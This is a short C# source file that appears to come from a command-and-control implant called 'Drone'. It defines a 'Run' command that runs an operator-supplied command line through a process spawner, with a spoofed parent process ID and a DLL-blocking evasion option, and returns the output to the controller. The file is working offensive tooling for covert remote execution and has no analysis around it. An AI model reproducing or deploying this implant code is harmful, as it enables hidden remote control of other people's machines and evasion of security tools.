using System.Linq;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Commands;

public sealed class Run : DroneCommand
{
    public override byte Command => 0x0E;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var ppid = Drone.Config.Get<int>(Setting.ParentPid);
        var blockDlls = Drone.Config.Get<bool>(Setting.BlockDlls);
        
        var spawner = new ProcessSpawner(ppid, blockDlls);

        var command = $"{task.Arguments[0]} {string.Join(" ", task.Arguments.Skip(1))}";
        var output = spawner.SpawnAndReadProcess(command);

        await Drone.SendOutput(task, output);
    }
}